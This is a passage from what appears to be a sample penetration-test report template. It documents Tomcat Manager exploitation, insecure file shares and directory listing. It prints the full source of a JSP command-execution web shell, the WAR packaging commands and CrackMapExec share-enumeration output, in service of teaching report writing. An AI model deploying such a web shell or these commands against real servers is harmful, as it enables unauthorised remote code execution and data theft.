{"text": "achieve remote code execution. 25\\n$ cat cmd.jsp <%@ page import=\"java.util.*,java.io.*\"%> <% // // JSP_KIT // // cmd.jsp = Command Execution (unix) // // by: Unknown // modified: 27/06/2003 // %> <HTML><BODY> <FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"> <INPUT TYPE=\"text\" NAME=\"cmd\"> <INPUT TYPE=\"submit\" VALUE=\"Send\"> </FORM> <pre> <% if (request.getParameter(\"cmd\") != null) { out.println(\"Command: \" + request.getParameter(\"cmd\") + \"<BR>\"); Process p = Runtime.getRuntime().exec(request.getParameter(\"cmd\")); OutputStream os = p.getOutputStream(); InputStream in = p.getInputStream(); DataInputStream dis = new DataInputStream(in); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); } } %> </pre> </BODY></HTML> Figure 27: Contents of JSP Web Shell The web shell was compressed into a WAR archive file which can be deployed as an application via the Tomcat Web Application Manager. $ jar -cvf deploymenttest.war cmd.jsp added manifest adding: cmd.jsp(in = 829) (out= 422)(deflated 49%) Figure 28: Creating a WAR File The tester next logged in to the Tomcat Web Application Manager accessible at the URL http://192.168.195.205:8080/manager/html. 26\\nFigure 29: Logged in to Tomcat Manager Next, the tester uploaded the WAR file created earlier and deployed it as an application via the Tomcat Web Application Manager. Figure 30: Deploying Web Application Figure 31: Web Application Deployed With this web shell in place, the tester was able to run commands on the underlying server. 27\\nFigure 32: Running ipconfig Command From here it would be possible to leverage user account privileges to escalate to the powerful NT AUTHORITY\\SYSTEM account and begin to enumerate the Active Directory domain. Figure 33: Confirming Account Privileges 28\\n6. Insecure File Shares - Medium CWE CWE-284 CVSS 3.1 Score 6.2 Description (Incl. Root The tester uncovered multiple file shares where all Domain Users have read/write access. Cause) An attacker who gains a foothold in this domain can use this access to search for files Security Impact containing sensitive data such as credentials and potentially write malicious files to the file shares. Affected Domain ï‚· INLANEFREIGHT.LOCAL Review file share privileges to ensure that users are granted access in accordance with the Remediation principal of least privilege. External References https://attack.mitre.org/techniques/T1135/ Finding Evidence: Viewing file shares accessible to a standard Domain user with the CrackMapExec tool. $ sudo crackmapexec smb 192.168.195.205 -u asmith -p <REDACTED> --shares SMB 192.168.195.205 445 MS01 [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False) SMB 192.168.195.205 445 MS01 [+] INLANEFREIGHT.LOCAL\\asmith:<REDACTED> SMB 192.168.195.205 445 MS01 [+] Enumerated shares SMB 192.168.195.205 445 MS01 Share Permissions Remark SMB 192.168.195.205 445 MS01 ----- ----------- ------ SMB 192.168.195.205 445 MS01 ADMIN$ Remote Admin SMB 192.168.195.205 445 MS01 Backups READ SMB 192.168.195.205 445 MS01 C$ Default share SMB 192.168.195.205 445 MS01 IPC$ READ Remote IPC SMB 192.168.195.205 445 MS01 Migration Data READ SMB 192.168.195.205 445 MS01 Software READ,WRITE Figure 34: Listing Accessible Shares 29\\n7. Directory Listing Enabled - Low CWE CWE-548 CVSS 3.1 Score 4.3 Description (Incl. Root The web application exposes a directory listing of some files in the web root and subfolders. Cause) The severity of this finding depends on the sensitivity of the files exposed on the web", "metadata": {"doc_id": "Hack the Box - sample-penetration-testing-report-template", "chunk_id": 14}}